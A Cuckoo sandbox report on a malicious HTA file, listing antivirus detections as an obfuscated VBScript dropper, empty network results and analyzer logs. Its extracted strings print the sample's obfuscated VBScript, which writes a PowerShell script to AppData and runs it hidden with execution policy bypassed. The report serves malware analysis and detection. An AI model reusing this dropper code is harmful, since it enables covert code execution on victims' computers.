@@ -1,0 +1,1296 @@
+{
+    "info": {
+        "added": 1777230398.632004, 
+        "started": 1777230398.834372, 
+        "duration": 26, 
+        "ended": 1777230425.057774, 
+        "owner": null, 
+        "score": 10, 
+        "id": 7526401, 
+        "category": "file", 
+        "git": {
+            "head": "", 
+            "fetch_head": ""
+        }, 
+        "monitor": null, 
+        "package": "hta", 
+        "route": "internet", 
+        "custom": null, 
+        "machine": {
+            "status": "stopped", 
+            "name": "Ubuntu1904x647", 
+            "label": "Ubuntu1904x647", 
+            "platform": "linux", 
+            "manager": "VirtualBox", 
+            "started_on": "2026-04-26 19:06:39", 
+            "shutdown_on": "2026-04-26 19:07:04"
+        }, 
+        "platform": null, 
+        "version": "2.0.7", 
+        "options": "procmemdump=yes,route=internet"
+    }, 
+    "signatures": [
+        {
+            "families": [], 
+            "description": "Yara rule detected for file", 
+            "severity": 1, 
+            "ttp": {}, 
+            "markcount": 1, 
+            "references": [], 
+            "marks": [
+                {
+                    "type": "generic", 
+                    "description": "(no description)", 
+                    "rule": "powershell"
+                }
+            ], 
+            "name": "file_yara"
+        }, 
+        {
+            "families": [], 
+            "description": "File has been identified by 4 AntiVirus engine on IRMA as malicious", 
+            "severity": 25, 
+            "ttp": {}, 
+            "markcount": 4, 
+            "references": [], 
+            "marks": [
+                {
+                    "category": "G Data Antivirus (Windows)", 
+                    "ioc": "Virus: GT:VB.ObfDldr.31.2D14C066 (Engine A)", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "eScan Antivirus (Linux)", 
+                    "ioc": "GT:VB.ObfDldr.31.2D14C066(DB)", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "ESET Security (Windows)", 
+                    "ioc": "VBS/TrojanDropper.Agent.PZK trojan", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "Emsisoft Commandline Scanner (Windows)", 
+                    "ioc": "GT:VB.ObfDldr.31.2D14C066 (B)", 
+                    "type": "ioc", 
+                    "description": null
+                }
+            ], 
+            "name": "antivirus_irma"
+        }, 
+        {
+            "families": [], 
+            "description": "File has been identified by 15 AntiVirus engines on VirusTotal as malicious", 
+            "severity": 60, 
+            "ttp": {}, 
+            "markcount": 15, 
+            "references": [], 
+            "marks": [
+                {
+                    "category": "CTX", 
+                    "ioc": "html.unknown.obfdldr", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "Skyhigh", 
+                    "ioc": "BehavesLike.HTML.Dropper.mq", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "ALYac", 
+                    "ioc": "GT:VB.ObfDldr.31.2D14C066", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "VIPRE", 
+                    "ioc": "GT:VB.ObfDldr.31.2D14C066", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "Arcabit", 
+                    "ioc": "GT:VB.ObfDldr.31.2D14C066", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "Symantec", 
+                    "ioc": "Scr.Malscript!gen24", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "ESET-NOD32", 
+                    "ioc": "VBS/TrojanDropper.Agent.PZK trojan", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "BitDefender", 
+                    "ioc": "GT:VB.ObfDldr.31.2D14C066", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "NANO-Antivirus", 
+                    "ioc": "Trojan.Script.Vbs-heuristic.druvzi", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "MicroWorld-eScan", 
+                    "ioc": "GT:VB.ObfDldr.31.2D14C066", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "Emsisoft", 
+                    "ioc": "GT:VB.ObfDldr.31.2D14C066 (B)", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "McAfeeD", 
+                    "ioc": "Trojan:Script/Downloader.W!1", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "GData", 
+                    "ioc": "GT:VB.ObfDldr.31.2D14C066", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "huorong", 
+                    "ioc": "HEUR:Trojan/VBS.Starter.c", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "Fortinet", 
+                    "ioc": "VBS/Agent.BGW!tr", 
+                    "type": "ioc", 
+                    "description": null
+                }
+            ], 
+            "name": "antivirus_virustotal"
+        }
+    ], 
+    "target": {
+        "category": "file", 
+        "file": {
+            "mimetype": "text/html", 
+            "yara": [
+                {
+                    "meta": {
+                        "description": "(no description)"
+                    }, 
+                    "name": "powershell", 
+                    "offsets": {
+                        "a": [
+                            [
+                                14685, 
+                                0
+                            ], 
+                            [
+                                15539, 
+                                0
+                            ], 
+                            [
+                                16131, 
+                                0
+                            ]
+                        ]
+                    }, 
+                    "strings": [
+                        "cG93ZXJzaGVsbA=="
+                    ]
+                }
+            ], 
+            "sha1": "7122803aea0b93b023bf4ae5be010705de1b9301", 
+            "name": "adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9", 
+            "type": "HTML document, Unicode text, UTF-8 text, with very long lines (589)", 
+            "sha256": "adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9", 
+            "urls": [], 
+            "crc32": "A5478A4B", 
+            "path": "/srv/cuckoo/cwd/storage/binaries/adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9", 
+            "ssdeep": null, 
+            "size": 24430, 
+            "sha512": "a97335b409159f8dff0ae0a32ef3cc2804cc23c613dc6fe0162d49968ba41d5476b3a5fffcaf23dfc58e40f9b87882208dbbc53e48960a941c2a9b0fc4c4f66a", 
+            "md5": "264bcc24dcaaa6b6ee4a7a3d9f18d94d"
+        }, 
+        "custom": null
+    }, 
+    "irma": {
+        "status": 1, 
+        "probes_finished": 13, 
+        "scan_id": "62c660d6-7454-4493-8a9f-4ad401c872f3", 
+        "parent_file_sha256": null, 
+        "file_infos": {
+            "mimetype": "HTML document, UTF-8 Unicode text, with very long lines", 
+            "sha1": "7122803aea0b93b023bf4ae5be010705de1b9301", 
+            "tags": [], 
+            "timestamp_first_scan": 1777219625.44, 
+            "size": 24430, 
+            "timestamp_last_scan": 1777219636.81, 
+            "sha256": "adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9", 
+            "md5": "264bcc24dcaaa6b6ee4a7a3d9f18d94d"
+        }, 
+        "scan_date": 1777219625, 
+        "other_results": [], 
+        "submitter": "cli", 
+        "probes_total": 13, 
+        "probe_results": {
+            "antivirus": {
+                "G Data Antivirus (Windows)": {
+                    "status": 1, 
+                    "duration": 0.33, 
+                    "version": "5.5.20197.1358", 
+                    "results": "Virus: GT:VB.ObfDldr.31.2D14C066 (Engine A)", 
+                    "virus_database_version": "unavailable"
+                }, 
+                "Avast Core Security (Linux)": {
+                    "status": 0, 
+                    "duration": 0.02, 
+                    "version": "4.6.1", 
+                    "results": null, 
+                    "virus_database_version": "unavailable"
+                }, 
+                "C4S ClamAV (Linux)": {
+                    "status": 0, 
+                    "duration": 0.06, 
+                    "version": "1.4.3", 
+                    "results": null, 
+                    "virus_database_version": "27965"
+                }, 
+                "Trellix (Linux)": {
+                    "status": 0, 
+                    "duration": 8.25, 
+                    "version": "7.0.4.835", 
+                    "results": null, 
+                    "virus_database_version": "11753"
+                }, 
+                "WithSecure (Linux)": {
+                    "status": 0, 
+                    "duration": 0.03, 
+                    "version": "1.0.44", 
+                    "results": null, 
+                    "virus_database_version": "unavailable"
+                }, 
+                "eScan Antivirus (Linux)": {
+                    "status": 1, 
+                    "duration": 4.64, 
+                    "version": "7.0.21", 
+                    "results": "GT:VB.ObfDldr.31.2D14C066(DB)", 
+                    "virus_database_version": "7.100629 (08/04/2026)"
+                }, 
+                "ESET Security (Windows)": {
+                    "status": 1, 
+                    "duration": 0.64, 
+                    "version": "unavailable", 
+                    "results": "VBS/TrojanDropper.Agent.PZK trojan", 
+                    "virus_database_version": "unavailable"
+                }, 
+                "Sophos Anti-Virus (Linux)": {
+                    "status": 0, 
+                    "duration": 0.1, 
+                    "version": "1.2.0.8 (2026-02-13)", 
+                    "results": null, 
+                    "virus_database_version": "unavailable"
+                }, 
+                "DrWeb Antivirus (Linux)": {
+                    "status": 0, 
+                    "duration": 0.15, 
+                    "version": "11.1.16.2406170954", 
+                    "results": null, 
+                    "virus_database_version": "unavailable"
+                }, 
+                "ClamAV (Linux)": {
+                    "status": 0, 
+                    "duration": 0.06, 
+                    "version": "1.4.3", 
+                    "results": null, 
+                    "virus_database_version": "27965"
+                }, 
+                "Bitdefender Antivirus (Linux)": {
+                    "status": 0, 
+                    "duration": 9.29, 
+                    "version": "7.90123", 
+                    "results": null, 
+                    "virus_database_version": null
+                }, 
+                "Kaspersky Standard (Windows)": {
+                    "status": 0, 
+                    "duration": 0.73, 
+                    "version": "21.21", 
+                    "results": null, 
+                    "virus_database_version": "2026-04-25 22:48:00 (full)"
+                }, 
+                "Emsisoft Commandline Scanner (Windows)": {
+                    "status": 1, 
+                    "duration": 0.19, 
+                    "version": "2025.1.0.12641", 
+                    "results": "GT:VB.ObfDldr.31.2D14C066 (B)", 
+                    "virus_database_version": "unavailable"
+                }
+            }
+        }, 
+        "path": "", 
+        "result_id": "65686558-4239-4189-b18c-7b571fa5a9c6", 
+        "name": "adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9"
+    }, 
+    "suricata": {
+        "tls": [], 
+        "files": [], 
+        "alerts": [], 
+        "http": []
+    }, 
+    "virustotal": {
+        "permalink": "https://www.virustotal.com/gui/file/adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9/detection/f-adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9-1777218275", 
+        "sha1": "7122803aea0b93b023bf4ae5be010705de1b9301", 
+        "resource": "264bcc24dcaaa6b6ee4a7a3d9f18d94d", 
+        "response_code": 1, 
+        "scan_date": "2026-04-26 15:44:35", 
+        "scan_id": "adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9-1777218275", 
+        "summary": {
+            "positives": 15, 
+            "permalink": "https://www.virustotal.com/gui/file/adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9/detection/f-adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9-1777218275", 
+            "scan_date": "2026-04-26 15:44:35"
+        }, 
+        "sha256": "adfcbd2e6d09cdbf72f9d5ce8388ce796fa3025d3df34b4102c13a93f4092bd9", 
+        "normalized": [
+            "obfdldr", 
+            "Malscript", 
+            "gen24", 
+            "PZK trojan", 
+            "druvzi", 
+            "Starter"
+        ], 
+        "total": 61, 
+        "positives": 15, 
+        "verbose_msg": "Scan finished, information embedded", 
+        "md5": "264bcc24dcaaa6b6ee4a7a3d9f18d94d", 
+        "scans": {
+            "Bkav": {
+                "detected": false, 
+                "version": "2.0.0.1", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260425"
+            }, 
+            "Lionic": {
+                "detected": false, 
+                "version": "8.16", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "ClamAV": {
+                "detected": false, 
+                "version": "1.5.2.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "CTX": {
+                "detected": true, 
+                "version": "2024.8.29.1", 
+                "result": "html.unknown.obfdldr", 
+                "normalized": [
+                    "obfdldr"
+                ], 
+                "update": "20260426"
+            }, 
+            "CAT-QuickHeal": {
+                "detected": false, 
+                "version": "22.00", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260425"
+            }, 
+            "Skyhigh": {
+                "detected": true, 
+                "version": "v2021.2.0+4045", 
+                "result": "BehavesLike.HTML.Dropper.mq", 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "ALYac": {
+                "detected": true, 
+                "version": "2.0.0.10", 
+                "result": "GT:VB.ObfDldr.31.2D14C066", 
+                "normalized": [
+                    "ObfDldr"
+                ], 
+                "update": "20260426"
+            }, 
+            "Malwarebytes": {
+                "detected": false, 
+                "version": "3.1.0.231", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "VIPRE": {
+                "detected": true, 
+                "version": "6.0.0.35", 
+                "result": "GT:VB.ObfDldr.31.2D14C066", 
+                "normalized": [
+                    "ObfDldr"
+                ], 
+                "update": "20260426"
+            }, 
+            "Sangfor": {
+                "detected": false, 
+                "version": "2.22.3.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260424"
+            }, 
+            "CrowdStrike": {
+                "detected": false, 
+                "version": "1.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20251219"
+            }, 
+            "K7GW": {
+                "detected": false, 
+                "version": "14.48.59318", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "K7AntiVirus": {
+                "detected": false, 
+                "version": "14.48.59317", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Arcabit": {
+                "detected": true, 
+                "version": "2025.0.0.23", 
+                "result": "GT:VB.ObfDldr.31.2D14C066", 
+                "normalized": [
+                    "ObfDldr"
+                ], 
+                "update": "20260426"
+            }, 
+            "VirIT": {
+                "detected": false, 
+                "version": "9.5.1194", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260424"
+            }, 
+            "Symantec": {
+                "detected": true, 
+                "version": "1.22.0.0", 
+                "result": "Scr.Malscript!gen24", 
+                "normalized": [
+                    "Malscript", 
+                    "gen24"
+                ], 
+                "update": "20260424"
+            }, 
+            "ESET-NOD32": {
+                "detected": true, 
+                "version": "18.2.18.0", 
+                "result": "VBS/TrojanDropper.Agent.PZK trojan", 
+                "normalized": [
+                    "PZK trojan"
+                ], 
+                "update": "20260426"
+            }, 
+            "TrendMicro-HouseCall": {
+                "detected": false, 
+                "version": "24.550.0.1002", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Avast": {
+                "detected": false, 
+                "version": "23.9.8494.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260322"
+            }, 
+            "Cynet": {
+                "detected": false, 
+                "version": "4.0.3.4", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Kaspersky": {
+                "detected": false, 
+                "version": "22.0.1.28", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "BitDefender": {
+                "detected": true, 
+                "version": "7.2", 
+                "result": "GT:VB.ObfDldr.31.2D14C066", 
+                "normalized": [
+                    "ObfDldr"
+                ], 
+                "update": "20260426"
+            }, 
+            "NANO-Antivirus": {
+                "detected": true, 
+                "version": "1.0.170.26895", 
+                "result": "Trojan.Script.Vbs-heuristic.druvzi", 
+                "normalized": [
+                    "druvzi"
+                ], 
+                "update": "20260426"
+            }, 
+            "SUPERAntiSpyware": {
+                "detected": false, 
+                "version": "5.6.0.1032", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260425"
+            }, 
+            "MicroWorld-eScan": {
+                "detected": true, 
+                "version": "14.0.409.0", 
+                "result": "GT:VB.ObfDldr.31.2D14C066", 
+                "normalized": [
+                    "ObfDldr"
+                ], 
+                "update": "20260426"
+            }, 
+            "Rising": {
+                "detected": false, 
+                "version": "25.0.0.28", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Emsisoft": {
+                "detected": true, 
+                "version": "2024.8.0.61147", 
+                "result": "GT:VB.ObfDldr.31.2D14C066 (B)", 
+                "normalized": [
+                    "ObfDldr"
+                ], 
+                "update": "20260426"
+            }, 
+            "F-Secure": {
+                "detected": false, 
+                "version": "18.10.1547.307", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "DrWeb": {
+                "detected": false, 
+                "version": "7.0.75.2070", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Zillya": {
+                "detected": false, 
+                "version": "2.0.0.5588", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260424"
+            }, 
+            "TrendMicro": {
+                "detected": false, 
+                "version": "24.550.0.1002", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "McAfeeD": {
+                "detected": true, 
+                "version": "1.2.0.14532", 
+                "result": "Trojan:Script/Downloader.W!1", 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "CMC": {
+                "detected": false, 
+                "version": "2.4.2022.1", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Sophos": {
+                "detected": false, 
+                "version": "3.4.1.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Ikarus": {
+                "detected": false, 
+                "version": "6.4.16.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Jiangmin": {
+                "detected": false, 
+                "version": "16.0.100", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Google": {
+                "detected": false, 
+                "version": "1777212050", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Avira": {
+                "detected": false, 
+                "version": "8.3.3.24", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Antiy-AVL": {
+                "detected": false, 
+                "version": "3.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Kingsoft": {
+                "detected": false, 
+                "version": "None", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Gridinsoft": {
+                "detected": false, 
+                "version": "1.0.244.174", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Xcitium": {
+                "detected": false, 
+                "version": "38598", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Microsoft": {
+                "detected": false, 
+                "version": "1.1.26030.3008", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "ViRobot": {
+                "detected": false, 
+                "version": "2014.3.20.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "ZoneAlarm": {
+                "detected": false, 
+                "version": "6.24-114820516", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "GData": {
+                "detected": true, 
+                "version": "GD:27.44329AVA:64.31119", 
+                "result": "GT:VB.ObfDldr.31.2D14C066", 
+                "normalized": [
+                    "ObfDldr"
+                ], 
+                "update": "20260426"
+            }, 
+            "Varist": {
+                "detected": false, 
+                "version": "6.6.1.3", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "AhnLab-V3": {
+                "detected": false, 
+                "version": "3.30.0.10666", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Acronis": {
+                "detected": false, 
+                "version": "1.2.0.121", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20240328"
+            }, 
+            "VBA32": {
+                "detected": false, 
+                "version": "5.6.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260425"
+            }, 
+            "TACHYON": {
+                "detected": false, 
+                "version": "2026-04-23.02", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260423"
+            }, 
+            "Zoner": {
+                "detected": false, 
+                "version": "2.2.2.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Tencent": {
+                "detected": false, 
+                "version": "1.0.0.1", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "Yandex": {
+                "detected": false, 
+                "version": "5.5.2.24", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "TrellixENS": {
+                "detected": false, 
+                "version": "6.0.6.653", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "huorong": {
+                "detected": true, 
+                "version": "07ae075:07ae075:a9d2355:a9d2355", 
+                "result": "HEUR:Trojan/VBS.Starter.c", 
+                "normalized": [
+                    "Starter"
+                ], 
+                "update": "20260426"
+            }, 
+            "MaxSecure": {
+                "detected": false, 
+                "version": "1.0.0.1", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260424"
+            }, 
+            "Fortinet": {
+                "detected": true, 
+                "version": "7.0.30.0", 
+                "result": "VBS/Agent.BGW!tr", 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "AVG": {
+                "detected": false, 
+                "version": "23.9.8494.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260322"
+            }, 
+            "Panda": {
+                "detected": false, 
+                "version": "4.6.4.2", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20260426"
+            }, 
+            "alibabacloud": {
+                "detected": false, 
+                "version": "2.2.0", 
+                "result": null, 
+                "normalized": [], 
+                "update": "20250321"
+            }
+        }
+    }, 
+    "network": {
+        "tls": [], 
+        "udp": [], 
+        "dns_servers": [], 
+        "http": [], 
+        "icmp": [], 
+        "smtp": [], 
+        "tcp": [], 
+        "smtp_ex": [], 
+        "geoinfo": {}, 
+        "mitm": [], 
+        "hosts": [], 
+        "pcap_sha256": "704e5e5b3234433c01fcfd1b20a306e77e985038120492dc53965c3edd38a4ea", 
+        "dns": [], 
+        "http_ex": [], 
+        "domains": [], 
+        "dead_hosts": [], 
+        "irc": [], 
+        "https_ex": []
+    }, 
+    "resubmit": {
+        "resubmit_ids": []
+    }, 
+    "snort": {
+        "alerts": []
+    }, 
+    "debug": {
+        "action": [], 
+        "dbgview": [], 
+        "errors": [], 
+        "log": [
+            "2026-04-26 19:06:38,001 [root] DEBUG: Starting analyzer from: /tmp/tmpH4aRzC\n", 
+            "2026-04-26 19:06:38,002 [root] DEBUG: Storing results at: /tmp/FxzLIXDo\n", 
+            "2026-04-26 19:06:38,003 [root] ERROR: Traceback (most recent call last):\n", 
+            "  File \"/tmp/tmpH4aRzC/analyzer.py\", line 340, in <module>\n", 
+            "    success = analyzer.run()\n", 
+            "  File \"/tmp/tmpH4aRzC/analyzer.py\", line 129, in run\n", 
+            "    self.config.file_name, **kwargs)\n", 
+            "  File \"/tmp/tmpH4aRzC/lib/core/packages.py\", line 42, in choose_package_class\n", 
+            "    \"exist.\".format(name))\n", 
+            "Exception: Unable to import package \"hta\": it does not exist.\n", 
+            "Traceback (most recent call last):\n", 
+            "  File \"/tmp/tmpH4aRzC/analyzer.py\", line 340, in <module>\n", 
+            "    success = analyzer.run()\n", 
+            "  File \"/tmp/tmpH4aRzC/analyzer.py\", line 129, in run\n", 
+            "    self.config.file_name, **kwargs)\n", 
+            "  File \"/tmp/tmpH4aRzC/lib/core/packages.py\", line 42, in choose_package_class\n", 
+            "    \"exist.\".format(name))\n", 
+            "Exception: Unable to import package \"hta\": it does not exist.\n"
+        ], 
+        "cuckoo": [
+            "2026-04-26 19:06:38,925 [cuckoo.core.scheduler] INFO: Task #7526401: acquired machine Ubuntu1904x647 (label=Ubuntu1904x647)\n", 
+            "2026-04-26 19:06:38,926 [cuckoo.core.resultserver] DEBUG: Now tracking machine 192.168.168.107 for task #7526401\n", 
+            "2026-04-26 19:06:39,262 [cuckoo.auxiliary.sniffer] INFO: Started sniffer with PID 3767060 (interface=vboxnet0, host=192.168.168.107)\n", 
+            "2026-04-26 19:06:39,299 [cuckoo.machinery.virtualbox] DEBUG: Starting vm Ubuntu1904x647\n", 
+            "2026-04-26 19:06:39,986 [cuckoo.machinery.virtualbox] DEBUG: Restoring virtual machine Ubuntu1904x647 to Snapshot\n", 
+            "2026-04-26 19:06:46,860 [cuckoo.core.guest] INFO: Starting analysis #7526401 on guest (id=Ubuntu1904x647, ip=192.168.168.107)\n", 
+            "2026-04-26 19:06:47,867 [cuckoo.core.guest] DEBUG: Ubuntu1904x647: not ready yet\n", 
+            "2026-04-26 19:06:52,893 [cuckoo.core.guest] INFO: Guest is running Cuckoo Agent 0.10 (id=Ubuntu1904x647, ip=192.168.168.107)\n", 
+            "2026-04-26 19:06:52,914 [cuckoo.core.guest] DEBUG: Uploading analyzer to guest (id=Ubuntu1904x647, ip=192.168.168.107, monitor=latest, size=73219)\n", 
+            "2026-04-26 19:06:53,126 [cuckoo.core.resultserver] DEBUG: Task #7526401: live log analysis.log initialized.\n", 
+            "2026-04-26 19:06:56,026 [cuckoo.core.guest] INFO: Ubuntu1904x647: analysis completed successfully\n", 
+            "2026-04-26 19:06:56,038 [cuckoo.core.plugins] DEBUG: Stopped auxiliary module: Redsocks\n", 
+            "2026-04-26 19:06:56,072 [cuckoo.core.plugins] DEBUG: Stopped auxiliary module: Sniffer\n", 
+            "2026-04-26 19:06:57,064 [cuckoo.machinery.virtualbox] INFO: Successfully generated memory dump for virtual machine with label Ubuntu1904x647 to path /srv/cuckoo/cwd/storage/analyses/7526401/memory.dmp\n", 
+            "2026-04-26 19:06:57,065 [cuckoo.machinery.virtualbox] DEBUG: Stopping vm Ubuntu1904x647\n", 
+            "2026-04-26 19:07:04,728 [cuckoo.core.resultserver] DEBUG: Stopped tracking machine 192.168.168.107 for task #7526401\n", 
+            "2026-04-26 19:07:05,013 [cuckoo.core.scheduler] DEBUG: Released database task #7526401\n", 
+            "2026-04-26 19:07:05,045 [cuckoo.core.scheduler] INFO: Task #7526401: analysis procedure completed\n"
+        ]
+    }, 
+    "strings": [
+        "<html>", 
+        "<head>", 
+        "<meta charset=\"utf-8\">", 
+        "<HTA:APPLICATION", 
+        "    ID=\"hxz6bvL\"", 
+        "    APPLICATIONNAME=\"uezCGIcSKZn\"", 
+        "    BORDER=\"thick\"", 
+        "    BORDERSTYLE=\"normal\"", 
+        "    CAPTION=\"yes\"", 
+        "    SHOWINTASKBAR=\"yes\"", 
+        "    SINGLEINSTANCE=\"yes\"", 
+        "    SYSMENU=\"yes\"", 
+        "    WINDOWSTATE=\"normal\"", 
+        "    SCROLL=\"no\"", 
+        "    NAVIGABLE=\"yes\"", 
+        "    CONTEXTMENU=\"no\"", 
+        "    SELECTION=\"no\"", 
+        "<script language=\"VBScript\">", 
+        "' handle mgr", 
+        "Function cbX7LE()", 
+        "    Dim aF6bQ, y4oqDr7", 
+        "    aF6bQ = 28252", 
+        "    y4oqDr7 = 80602", 
+        "    cbX7LE = aF6bQ", 
+        "End Function", 
+        "' mgr data update check verify", 
+        "Function ZGS2MHrUCMt()", 
+        "    Dim gGM1M, SU3qf3_R", 
+        "    gGM1M = 46481", 
+        "    SU3qf3_R = 36687", 
+        "    ZGS2MHrUCMt = gGM1M", 
+        "End Function", 
+        "' mgr comp", 
+        "Function Xgp2BLC()", 
+        "    Dim hJeTz, R73d3cN", 
+        "    hJeTz = 39170", 
+        "    R73d3cN = 13777", 
+        "    Xgp2BLC = hJeTz", 
+        "End Function", 
+        "' check sys", 
+        "Function T0fdnvRgAdUa()", 
+        "    Dim Oxc5Cxlt, AAGyffbd", 
+        "    Oxc5Cxlt = 55060", 
+        "    AAGyffbd = 25952", 
+        "    T0fdnvRgAdUa = Oxc5Cxlt", 
+        "End Function", 
+        "Sub Window_OnLoad()", 
+        "    On Error Resume Next", 
+        "    Dim JgzdIJxp47JEzq, mYUhuhO3W, ZvEnbffZk, VuwUvwR2faW", 
+        "    Set JgzdIJxp47JEzq = CreateObject(ChrW(87) & ChrW(83) & \"cr\" & Chr(130 - 25) & Chr(123 - 11) & ChrW(116) & Chr(46) & Chr(120 - 37) & \"hell\")", 
+        "    Set mYUhuhO3W = CreateObject(ChrW(83) & ChrW(99) & Chr(115 - 1) & Chr(105) & Chr(112) & \"ting\" & Chr(46) & Chr(118 - 48) & \"ile\" & ChrW(83) & Chr(121) & \"st\" & ChrW(101) & ChrW(109) & ChrW(79) & ChrW(98) & Chr(125 - 19) & ChrW(101) & Chr(99) & Chr(146 - 30))", 
+        "    ZvEnbffZk = JgzdIJxp47JEzq.ExpandEnvironmentStrings(Chr(50 - 13) & Chr(65) & Chr(100 - 20) & \"PDA\" & ChrW(84) & Chr(65) & Chr(71 - 34)) & Chr(92) & ChrW(77) & ChrW(105) & Chr(99) & ChrW(114) & \"osoft\" & Chr(112 - 20) & Chr(116) & Chr(98 - 44) & \"0CyMY\" & Chr(124 - 36) & Chr(70 - 24) & Chr(148 - 36) & Chr(128 - 13) & Chr(49)", 
+        "    Set VuwUvwR2faW = mYUhuhO3W.CreateTextFile(ZvEnbffZk, True)", 
+        "    VuwUvwR2faW.Write GetPS1()", 
+        "    VuwUvwR2faW.Close", 
+        "    JgzdIJxp47JEzq.Run ChrW(112) & Chr(111) & Chr(148 - 29) & \"er\" & \"sh\" & Chr(150 - 49) & Chr(129 - 21) & Chr(132 - 24) & ChrW(46) & ChrW(101) & Chr(120) & \"e \" & ChrW(45) & Chr(69) & Chr(149 - 29) & Chr(101) & \"cut\" & Chr(105) & \"onPol\" & ChrW(105) & ChrW(99) & Chr(171 - 50) & Chr(56 - 24) & \"By\" & \"pas\" & Chr(118 - 3) & Chr(32) & Chr(45) & \"Wi\" & Chr(110) & ChrW(100) & \"ow\" & \"Styl\" & ChrW(101) & ChrW(32) & Chr(72) & Chr(105) & Chr(100) & Chr(115 - 15) & Chr(151 - 50) & ChrW(110) & Chr(60 - 28) & Chr(45) & \"Fil\" & Chr(139 - 38) & Chr(32) & Chr(34) & ZvEnbffZk & Chr(34), 0, False", 
+        "End Sub", 
+        "Function GetPS1()", 
+        "Dim EVwOwCgnDYG4", 
